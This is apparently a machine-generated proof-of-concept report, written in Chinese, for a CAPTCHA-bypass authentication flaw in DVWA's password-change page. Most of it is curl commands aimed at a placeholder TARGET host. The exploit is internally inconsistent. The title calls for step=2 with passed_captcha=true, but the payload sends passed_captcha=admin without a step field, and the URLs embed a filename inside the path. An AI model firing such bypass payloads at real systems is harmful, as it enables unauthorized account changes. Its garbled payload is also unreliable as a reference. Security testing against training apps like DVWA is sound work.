# POC — DVWA 密码修改功能 CAPTCHA 校验可被绕过（step=2 直接提交 passed_captcha=true）

- finding_id: `LLM-9d59a2937bde`
- type: `auth_bypass` / CWE-287
- severity: `high`
- file: `015.php:69`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/vulnerabilities/captcha/ (015.php)'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 认证绕过 载荷**  
```http
curl -sS -i -X POST 'http://TARGET:8080/vulnerabilities/captcha/ (015.php)' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'passed_captcha=admin'
```
预期：以未授权/伪造身份访问受保护资源返回 2xx。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。